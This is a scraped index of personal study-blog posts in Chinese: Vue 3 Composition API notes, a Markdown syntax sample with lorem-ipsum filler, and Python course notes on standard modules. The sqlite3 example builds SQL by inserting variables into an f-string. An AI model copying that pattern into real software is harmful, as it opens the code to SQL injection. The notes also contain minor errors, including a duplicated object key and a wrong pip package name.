ref(0) const person = ref({ name: \u0026#34;張三\u0026#34;, name: 18, job: { job1: { salary: 20 } } }) watch(sum, (newValue, oldValue) =\u0026gt; { // 監視的是 sum 這個 RefImpl 數據，因此不需要 .value console.log(\u0026#34;sum的值變化了\u0026#34;, newValue, oldValue) }) // 方法一: watch(person.value, (newValue, oldValue) =\u0026gt; { // 監視 person.value 的 Proxy 對象 console.log(\u0026#34;person的值變化了\u0026#34;, newValue, oldValue) }) // 方法二: watch(person, (newValue, oldValue) =\u0026gt; { // 深度監視 person 的 Proxy 對象的屬性 console.log(\u0026#34;person的值變化了\u0026#34;, newValue, oldValue) }, { deep: true }) return { person } } } watchEffect 智能版 watch，不用指名監視哪個屬性，監視的回調中用到哪個屬性，就監視哪個屬性(而且是深層次的)。 watchEffect 有點像 computed： 但 computed 注重計算出來的值(回調函數的返回值)，所以必須要寫返回值。 而 watchEffect 更注重的是過程(回調函數的函數體)，所以不用寫返回值。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { ref, reactive, watchEffect } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(0) const person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) watchEffect(() =\u0026gt; { const x1 = sum.value const x2 = person.job.job1.salary console.log(\u0026#34;watchEffect 配置的回調執行了\u0026#34;) }) } } 自定義 hook 函數 hook 本質是一個函數，把 setup 函數中使用的 Composition API 進行了封裝。 類似於 vue 2.0 中的 mixin。 自定義 hook 的優勢：重複使用代碼，讓 setup 中的邏輯更清楚易懂。 命名通常建議以 \u0026ldquo;use\u0026rdquo; 開頭，例如： 一個獲取鼠標點擊位置的 hook src/hooks/usePoint.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import { reactive, onMounted, onBeforeUnmount} from \u0026#34;vue\u0026#34; export default function() { // 獲取鼠標點擊位置 相關的數據 let point = reactive({ x: 0, y: 0 }) // 獲取鼠標點擊位置 相關的方法 function savePoint(event) { console.log(event.pageX, event.pageY) point.x = event.pageX point.y = event.pageY } // 獲取鼠標點擊位置 相關的生命週期鉤子 onMounted(() =\u0026gt; { window.addEventListener(\u0026#34;click\u0026#34;, savePoint) }) onBeforeUnmount(() =\u0026gt; { window.removeEventListener(\u0026#34;click\u0026#34;, savePoint) }) return point } Demo.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 import usePoint from \u0026#34;@/hooks/usePoint\u0026#34; export default { name: \u0026#34;Demo\u0026#34;, setup() { // 使用自定義的 hook const point = usePoint() return { point } } } toRef 作用：創建一個 ref 對象，其 value 值指向(引用)另一個對象中的某個屬性(返回值為一個 ObjectRefImpl 對象，為響應式)。 語法： 1 const name = toRef(person, \u0026#34;name\u0026#34;) 應用：要將響應式對象中的某個屬性單獨提供給外部使用時。 擴展：toRefs 與 toRef 功能一致，但可以批量創建多個 ref 對象，語法： 1 toRefs(person) 使用範例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { reactive, toRef, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) const name1 = person.name // name1 僅為賦值，無響應式 const name2 = toRef(person, \u0026#34;name\u0026#34;) // name2 的值會指向(引用) person 的 name return { // errors： // name1: person.name, // 僅為賦值，無響應式 // name2: ref(person.name) // 初始值正常，但修改時不會改到 person 的 name，因為此寫法僅是將 \u0026#34;ref(pserson.name)\u0026#34; 賦值給 name2，而非將 name2 指向 person 的 name // success： // 模板中使用 {{ person.name }}...等： // person, // 一個一個給出，模板中使用 {{ name }}...等： // name: toRef(person, \u0026#34;name\u0026#34;), // age: toRef(person, \u0026#34;age\u0026#34;), // salary: toRef(person.job.job1, \u0026#34;salary\u0026#34;) // 一次全給出，模板中可直接使用 {{ name }}、{{ age }}、{{ job.job1.salary }} ...toRefs(person) } } } 其他的 Composition API 1. shallowReactive 與 shallowRef shallow：淺層的 shallowReactive：只處理對象最外層屬性的響應式(淺響應式)。 shallowRef：只處理基本數據類型的響應式，不進行對象的響應式處理。 什麼時候使用？ 如果有一個對象數據，結構比較深，但變化時只是外層屬性變化 =\u0026gt; shallowReactive。 如果有一個對象數據，後續功能不會修改該對象中的屬性，而是生成新的對象來替換 =\u0026gt; shallowRef。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { shallowRef, shallowReactive, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = shallowReactive({ // 只考慮第一層數據的響應式 name: \u0026#34;張三\u0026#34;, // 響應式 age: 18, // 響應式 job: { // 非響應式 job1: { salary: 20 } } }) let x = shallowRef({ // 基本類型時同 ref，但對象類型不是響應式(value 會變成一般的 Object 而不是 Proxy ) y: 0 }) return { x, ...toRefs(person) } } } 2. readonly 與 shallowReadonly readonly：讓一個響應式數據變為唯讀的(深層唯讀)。 shallowReadonly：讓一個響應式數據變為唯讀的(淺層唯讀)。 應用場景：不希望數據被修改時。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import { ref, reactive, toRefs, readonly, shallowReadonly} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // 將 sum 變為唯讀，保護數據不被修改 sum = readonly(sum) // 將 person 的所有屬性變為唯讀，保護所有屬性數據不被修改 person = readonly(person) // 將 person 的\u0026#34;第一層屬性數據\u0026#34;變為唯讀(name、age無法修改，但 job 可以) person = shallowReadonly(person) return { sum, ...toRefs(person) } } } toRaw 與 markRaw raw：原始。 toRaw： 作用：將一個由 reactive 生成的響應式對象轉為普通對象。 應用場景：用於讀取響應式對象對應的普通對象，對這個普通對象的所有操作，不會引起頁面更新。 markRaw： 作用：標記一個對象，使其永遠不會再成為響應式對象。 應用場景： 有些值不應被設置為響應式的，例如複雜的第三方類庫等。 當渲染具有不可變數據源的大列表時，跳過響應式轉換可以提高性能。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import { ref, reactive, toRaw, markRaw} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;張三\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) function showRawPerson() { const p = toRaw(person) console.log(p) // 返回的不再是 Proxy，而是 Object } function addCar() { let car = { name: \u0026#34;奔馳\u0026#34;, price: 40} person.car = markRaw(car) // 標記 person.car 不是響應式的數據(數據依舊可修改，但畫面不會變) } return { sum, ...toRefs(person), showRawPerson, addCar } } } customRef 作用：創建一個自定義的 ref，並對其依賴項跟蹤和更新觸發進行顯示控制。 實現防抖效果： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;template\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;keyWord\u0026#34; /\u0026gt; \u0026lt;h3\u0026gt; {{ keyWord }} \u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, customRef } from \u0026#34;vue\u0026#34; export default { setup() { // 使用 vue 提供的 ref // let keyWord = ref(\u0026#34;hello\u0026#34;) // 自定義的一個 ref function myRef(value, delay) { let timer return customRef((track, trigger) =\u0026gt; { return { get() { console.log(`有人從 myRef 這個容器中讀取數據了，我把${value}給他了`) track() // 通知 Vue 追蹤數據的變化(提前與 get 商量一下，讓它認為這個 value 是有用的) return value }, set(newValue) { console.log(`有人把 myRef 這個容器中的數據改為了${newValue}`) clearTimeout(timer) timer = setTimeout(() =\u0026gt; { value = newValue trigger() // 通知 Vue 去重新解析模板，以便觸發 get }, delay) } } }) } // 使用自定義的防抖 ref let keyWord = myRef(\u0026#34;hello\u0026#34;, 500) return { keyWord } } } \u0026lt;/script\u0026gt; provide 與 inject 作用：實現祖孫組件間通信。 套路：父組件有一個 provide 選項來提供數據，後代組件有一個 inject 選項來開始使用這些數據。 具體寫法： 1. 祖組件中： 1 2 3 4 5 6 7 8 9 10 11 12 import { reactive, toRefs, provide } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;App\u0026#34;, setup() { let car = reactive({ name: \u0026#34;奔馳\u0026#34;, price: \u0026#34;40W\u0026#34; }) provide(\u0026#34;car\u0026#34;, car) // 給自己的後代組件傳遞數據 return { ...toRefs(car) } } } 2. 後代組件中： 1 2 3 4 5 6 7 8 9 import { inject } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;Son\u0026#34;, setup() { let car = inject(\u0026#34;car\u0026#34;) console.log(car) return { car } } } 響應式數據的判斷 isRef：檢查一個值是否為一個 ref 對象。 isReactive：檢查一個對象是否是由 reactive 創建的響應式代理。 isReadonly：檢查一個對象是否是由 readonly 創建的唯讀代理。 isProxy：檢查一個對象是否是由 reactive 或是 readonly 方法創建的代理。 Teleport teleport：傳送、瞬間移動。 作用：能夠將我們的 組件 html 結構 移動到指定的位置。 具體寫法： 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;!-- to 也能寫 css select，例如 to=\u0026#34;#app\u0026#34; --\u0026gt; \u0026lt;div v-if=\u0026#34;isShow\u0026#34; class=\u0026#34;mask\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;dialog\u0026#34;\u0026gt; \u0026lt;h3\u0026gt; 我是一個彈窗 \u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;isShow = false\u0026#34;\u0026gt; 關閉彈窗 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; Suspense suspense：懸疑、懸而未決的。 作用：等待異步組件時，渲染一些額外內容，讓使用者有更好的用戶體驗。 使用步驟： 異步引用組件 1 2 import { defineAsyncComponent } from \u0026#34;vue\u0026#34; // 宣告異步組件時使用 const Child = defineAsyncComponent(() =\u0026gt;. import (\u0026#34;./components/Child.vue\u0026#34;)) 使用 Suspense 包裹組件，並配置好 default 與 fallback 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;我是App組件\u0026lt;/h3\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;Child /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h3\u0026gt;加載中......\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 全局 API 的轉移 Vue 2.0 有許多全局 API 和配置。 例如：註冊全局組件、註冊全局指令等。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 註冊全局組件 Vue.component(\u0026#34;MyButton\u0026#34;, { data() { return { count: 0 } }, template: \u0026#34;\u0026lt;button @click=\u0026#39;count++\u0026#39;\u0026gt;Clicked {{ count }}\u0026lt;/button\u0026gt;\u0026#34; }) // 註冊全局指令 Vue.directive(\u0026#34;focus\u0026#34;, { inserted: el =\u0026gt; el.focus() }) Vue 3.0 中對這些 API 做出了調整： 將全局的 API，即： Vue.xxx 調整到應用實例(app)上 2.0 全局 API(Vue) 3.0 實例 API(app) Vue.config.xxxx app.config.xxxx Vue.config.productionTip 移除 Vue.component app.component Vue.directive app.directive Vue.mixin app.mixin Vue.use app.use Vue.prototype app.config.globalProperties ","date":"2022-07-17T00:00:00Z","image":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/index_huc185496ed55e6f95ddd80689badb475a_232407_120x120_fill_q75_box_smart1.jpeg","permalink":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/","title":"尚硅谷 Vue3 視頻筆記"},{"content":"Markdown 是讓你快速撰寫筆記，流暢管理知識，支援多種衍生功能的生產力工具\n標題 當您想要將一段文字標示為標題的時候，請使用這個語法。\n請在行首輸入 # 符號，並在後面加上一個空白後，再輸入標題文字。\n標題有分成 6 個層級，# 的數量愈多，層級越低。\n1 2 3 4 5 6 # 第一層級標題 h1 ## 第二層級標題 h2 ### 第三層級標題 h3 #### 第四層級標題 h4 ##### 第五層級標題 h5 ###### 第六層級標題 h6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-07-16T00:00:00Z","image":"https://wayneblog.ga/2022-07-16/markdown-syntax/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-16/markdown-syntax/","title":"Markdown 語法指南"},{"content":" 指導教師：李菊權(0921-763623) python(版本3.8.2) 安裝至環境變數(Windows10) Add Python 3.8 to PATH 若沒勾選，需自行到(以下兩種方式進入環境變數設定)\n本機 ▸ 內容 控制台 ▸ 系統及安全性 ▸ 系統\n進階系統設定 ▸ 系統內容 ▸ 進階 ▸ 環境變數\n將python.exe目錄新增至環境變數\n(PATH ▸ 編輯 ▸ 新增) 1 2 3 4 5 6 7 8 9 ### python.exe預設位置(Windows10) C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ ### 找python.exe(Windows10) where python.exe \u0026gt; C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\python.exe ### 將以下此段路徑新增至環境變數 ### C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ Python介紹 Python 動態型別(強型別)/直譯式語言 動態型別：使用變數時不須預先宣告型別，依照設定之值而變。 強型別：不同型別無法進行運算。 直譯式語言：不須經過編譯即可直接執行。 副檔名：.py IDLE python官方提供的IDE 推薦開發環境 Anaconda Spyder - 整合開發程式 Python Shell (REPL) Python Shell (REPL) 模式\n進入Python Shell (REPL) 1 2 python \u0026gt;\u0026gt;\u0026gt; # 開頭變成\u0026gt;\u0026gt;\u0026gt;代表進入python shell 離開Python Shell (REPL) 1 quit() 清除當前Python Shell Screen 1 cls Python Plugin 作業系統模組 - os 載入模組 1 import os # 匯入系統模組 打開系統的指定程式 - os.system(程式名) 1 2 os.system(\u0026#34;mspaint\u0026#34;) # 打開小畫家 os.system(\u0026#34;calc\u0026#34;) # 打開計算機 列出目錄中所有檔案 - os.listdir(路徑) 1 os.listdir(\u0026#34;./\u0026#34;) # 當前目錄 取得當前目錄 - os.getcwd() 1 os.getcwd() 檢查目錄是否存在 - os.path.isdir(目錄路徑) 1 2 3 4 5 6 # 檢查當前位置是否存在export目錄 testDir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(testDir): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) 檢查檔案是否存在 - os.path.isfile(檔案路徑) 1 2 3 4 5 6 # 檢查當前位置是否存在text.txt testFile = os.getcwd() + \u0026#34;\\\\test.txt\u0026#34; if os.path.isfile(testFile): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) 檢查路徑是否存在 - os.path.exists(目錄路徑) 1 2 3 4 5 testPath = \u0026#34;\\\\etc\\\\hosts\u0026#34; if os.path.exists(testPath): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) 於指定路徑建立目錄 - os.mkdir(路徑+目錄名) 1 2 3 4 # 檢查當前目錄是否存在export目錄，沒有則建立 new_dir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(new_dir) != True: os.mkdir(new_dir) 影像處理模組 - PIL(Pillow) 安裝 PIL 模組 1 2 ### 使用 pip 安裝 PIL 模組 pip install PIL 載入模組 1 from PIL import Image 打開圖檔 - .open(圖檔路徑) 1 im = Image.open(\u0026#34;test.jpg\u0026#34;) 存檔 - .save(\u0026quot;檔名\u0026quot;, \u0026ldquo;[格式]\u0026rdquo;, [quality = 壓縮值(通常設定80或90)], [subsampling = 0]) 1 2 3 4 5 im = Image.open(\u0026#34;test.jpg\u0026#34;) # 打開圖檔 im.save(\u0026#34;test1.png\u0026#34;) # 轉存成png # 轉存成png並壓縮品質:80 im.save(\u0026#34;test2.png\u0026#34;, quality = 80, subsampling = 0) PIL常用的圖檔格式\n格式 BMP、EPS、GIF、JPEG、JPG、PNG、TIFF、PDF 調整圖片尺寸 - .resize((寬, 高) [, filter(濾波)設定]) 不會自動等比例縮放，需等比例縮放得自行計算比例。\n1 2 3 4 5 6 im = Image.open(\u0026#34;test.jpg\u0026#34;) # 載入圖片 width = 400 # 指定寬度為 400px ratio = float(width)/im.size[0] # 計算長寬比 height = int(im.size[1]*ratio) # 高度依長寬比計算並調整 nim = im.resize((width, height), Image.BILINEAR) nim.save(\u0026#34;test_resized.jpg\u0026#34;) # 另存調整尺寸後的圖檔 濾波設定值\nfilter(濾波) 說明 NEAREST 預設濾波，從輸入的圖檔中選取最近的像素作為輸出像素。 BILINEAR 雙線性內插濾波，再輸入圖像的 2*2 矩陣上進行線性插值。 BICUBIC 雙立方濾波，再輸入圖像的 4*4 矩陣上進行立方插值。 ANTIALIAS 平滑濾波，對所有可以影響輸出像素的輸入像素進行高質量的重採樣濾波，以計算輸出像素值。 圖像繪製工具 - turtle 1 2 3 4 5 6 7 8 9 import turtle # 匯入圖像繪製工具turtle turtle.showturtle() # 打開turtle turtle.forward(100) # turtle往前100 turtle.left(90) # 左轉90度 turtle.circle(30) # 畫半徑30的圓 turtle.reset() # 重新設定 turtle.goto(30,50) # 移動到指定座標 turtle.penup() # 將筆提起 turtle.pendown() # 將筆放下 數字模組 - math 1 2 3 4 5 6 7 8 9 10 11 import math print(math.pi) # 取圓周率 \u0026gt;\u0026gt;\u0026gt; 3.141592653589793 print(math.radians(45)) # 取弧度45度 \u0026gt;\u0026gt;\u0026gt; 0.7853981633974483 print(math.sin(math.radians(45))) # 取sin(45度) \u0026gt;\u0026gt;\u0026gt; 0.7071067811865476 print(math.factorial(5)) # 取階乘(5為1*2*3*4*5) \u0026gt;\u0026gt;\u0026gt; 120 print(math.gcd(27, 9)) # 取最大公因數 \u0026gt;\u0026gt;\u0026gt; 9 亂數模組 - random 1 2 3 4 5 6 7 8 9 10 11 12 import random random.random() # 取0~1的隨機數 \u0026gt;\u0026gt;\u0026gt; 0.5672829418362756 random.randint(1, 10) # 取1~10的隨機數 \u0026gt;\u0026gt;\u0026gt; 4 K = [2,6,9,8,14,20,30] # 先設定一個陣列 random.shuffle(K) # 打亂陣列排列(直接操作該陣列) print(K) \u0026gt;\u0026gt;\u0026gt; [30, 9, 2, 6, 14, 20, 8] 浮點數精度模組 - Decimal 1 2 3 4 5 6 7 print(0.1+0.1+0.1) \u0026gt;\u0026gt;\u0026gt; 0.30000000000000004 # 使用Decimal模組來避免浮點數精度問題 from decimal import Decimal print(Decimal(\u0026#34;0.1\u0026#34;)*3) \u0026gt;\u0026gt;\u0026gt; 0.3 抓DOS模式後方參數的模組 - sys 1 2 3 # sysArgv.py import sys print(sys.argv) 1 2 3 # 於DOS模式執行sysArgv.py並於後方帶參數A、B、C python sysArgv.py A B C \u0026gt;\u0026gt;\u0026gt; [\u0026#39;sysArgv.py\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;] 資料庫模組 - sqlite3 載入模組 1 import sqlite3 連接資料庫 - .connect() 資料庫連結.connect(資料庫名稱) 1 2 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) Cursor指標指到資料庫(以便使用資料庫物件操作資料庫) - .cursor() 資料庫物件 = 資料庫連結.cursor() 1 2 3 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() 執行SQL語法 - .execute() 資料庫物件.execute(SQL語法) 1 2 3 4 5 6 7 8 9 10 11 12 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() SQL = \u0026#34;CREATE TABLE IF NOT EXISTS UserScore(\u0026#39;Name\u0026#39; Text, \u0026#39;Score\u0026#39; Integer)\u0026#34; cursor.execute(SQL) # 使用變數 name = \u0026#39;Wayne\u0026#39; Score = 80 SQL = f\u0026#34;INSERT INTO UserScore VALUES(\u0026#39;{name}\u0026#39;, {Score})\u0026#34; cursor.execute(SQL) 提交當前的SQL事務(執行完SQL需使用此函式提交) - .commit() 資料庫連結.commit() 1 2 conn.commit() conn.close() 取得所有資料 - .fetchall() 資料庫物件.fetchall() 1 2 3 4 5 6 7 8 9 10 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) rows = cursor.fetchall() for row in rows: # format格式化資料型態 print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(row[0], row[1], row[2])) 取得單筆資料 - .fetchone() 資料庫物件.fetchone() 1 2 3 4 5 6 7 8 9 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) line = cursor.fetchone() if not line == None: print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(line[0], line[1], line[2])) 正規表達式模組 - re 以小寫r開頭再接字串，例如：r\u0026quot;\\d\u0026quot;、r\u0026quot;0-9\u0026quot; 規則寫法 說明 範例 {} 個數 \\d{4}-\\d{6}：台灣電話號碼格式0000-000000為符合 {n,} 至少出現n次 X{2,}：X至少出現2次才符合 ` ` 或 \\d 任意數字 \\d：0-9為符合 - 到 1-5：1 ~ 5為符合,a-z：a ~ z為符合 ^ 否定 ^aeiou：非a,e,i,o,u為符合 . 字元 .：字元皆符合,符號類(例如：\\n)不符合 * 重複前一個字元0~無限多次都符合 err*：err、errr、errrr\u0026hellip;等都為符合 ? 前一個字元可有可無皆符合 colou?r：color、colour皆為符合 + 前一個字元要一次以上才符合 er+：er不符合,err、errr\u0026hellip;等才符合 $ 1.位數由後往前匹配 2.為結尾才匹配 [1-9]\\d$：1 ~ 99皆為符合,100不符合 () 1.僅收集括號內的內容 2.分組別以便.group(組別)可以直接抓到值 r'\u0026lt;h3 class=\u0026quot;LC20lb DKV0Md\u0026quot;\u0026gt;(.*?)\u0026lt;/h3\u0026gt;'：僅回傳\u0026lt;h3\u0026gt;內的文字 \\b 邊界,為邊界則符合 dog\\b：\u0026lsquo;dog \u0026lsquo;符合,\u0026lsquo;dog\u0026rsquo;不符合 \\數字 分組向前參考 貪婪/逐步量詞 (*/?) 貪婪量詞 - *:0次~無限次皆符合。 1 2 3 re.match(r\u0026#34;\u0026lt;.*\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;大家好\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt;大家好\u0026lt;/h3\u0026gt; 逐步量詞 - ?:回傳最短的量詞。 1 2 3 re.match(r\u0026#34;\u0026lt;.*?\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;大家好\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt; 載入模組 1 import re 分割字串 - re.split(正則, 分割的字串) 1 2 3 print(re.split(\u0026#39;\\d\u0026#39;, \u0026#34;Andy1Ben2Cathy\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;Andy\u0026#39;, \u0026#39;Ben\u0026#39;, \u0026#39;Cathy\u0026#39;] 取代字元 - re.sub(正則, 欲取代的字元, 字串) 1 2 3 re.sub(\u0026#34;\\d\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;Andy1Ben2Cathy\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Andy-Ben-Cathy\u0026#39; 匹配字元 - re.match(欲匹配的文字, 字串) 1 2 3 re.match(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; 尋找字元(找第一個) - re.search(欲尋找的文字, 字串) 1 2 3 re.search(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; 尋找字元(找所有) - re.findall(欲尋找的文字, 字串) 1 2 3 re.findall(\u0026#39;\\d{4}-\\d{6}\u0026#39;, \u0026#34;jjladpoiwlkj 0800-123456 hjkpojas 0921-456873\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;0800-123456\u0026#39;, \u0026#39;0921-456873\u0026#39;] 抓html模組 - requests 載入模組 1 import requests GET 抓取檔案 - .get(網址) 1 response = requests.get(\u0026#34;https://www.baidu.com/\u0026#34;) GET 可帶的參數(需使用關鍵字參數) 說明 headers 請求的headers params 參數 cookies client的cookies 抓取標頭(head) - .head(網址) 1 2 # .head() -\u0026gt; 只抓標頭 reshead = requests.head(\u0026#34;https://www.baidu.com/\u0026#34;) 狀態碼 - status_code 1 2 3 print(response.status_code) \u0026gt;\u0026gt;\u0026gt; 200 # 200為正常連線 編碼格式 - encoding 1 2 3 4 5 